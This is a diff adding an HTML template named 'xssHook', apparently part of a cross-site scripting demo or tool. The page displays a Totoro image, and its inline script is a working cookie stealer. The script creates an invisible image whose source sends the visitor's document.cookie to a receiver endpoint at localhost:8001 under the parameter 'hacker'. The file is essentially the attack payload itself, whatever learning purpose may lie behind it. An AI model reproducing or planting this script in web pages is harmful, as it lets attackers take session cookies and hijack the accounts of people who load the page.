@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>xssHook</title>
+    <link rel="icon" href="{{ url_for('static', filename='favicon.ico') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" type="text/css">
+</head>
+<body>
+    <a href="{{ url_for('hack') }}">
+        <img alt="Walking Totoro" class="totoro" src="{{ url_for('static', filename='images/totoro.gif') }}" title="to~to~ro~">
+        <script>
+            var img =document.createElement('img');
+            img.width = 0;
+            img.height = 0;
+            img.src ='http://localhost:8001/receiver?hacker='+encodeURIComponent(document.cookie);
+        </script>
+    </a>
+</body>
+
+</html>
